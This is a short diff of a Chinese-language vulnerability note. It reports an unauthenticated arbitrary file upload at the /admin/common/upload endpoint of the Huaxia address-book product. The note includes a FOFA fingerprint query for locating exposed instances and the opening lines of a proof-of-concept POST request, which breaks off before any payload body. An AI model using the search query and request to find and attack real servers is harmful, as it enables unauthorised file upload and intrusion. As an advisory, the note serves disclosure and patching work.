@@ -1,13 +1,13 @@
-## 华夏通讯录存在前台upload任意文件上传
+华夏通讯录存在前台upload任意文件上传
 
 华夏通讯录存在前台由于在鉴权方面存在疏漏，导致了可未授权访问，从而通过/admin/common/upload接口进行任意文件上传。
 
-## fofa
+fofa
 ```
 icon_hash="1403225079" && ":) APPV1"
 ```
 
-## poc
+poc
 ```
 POST /admin/common/upload HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
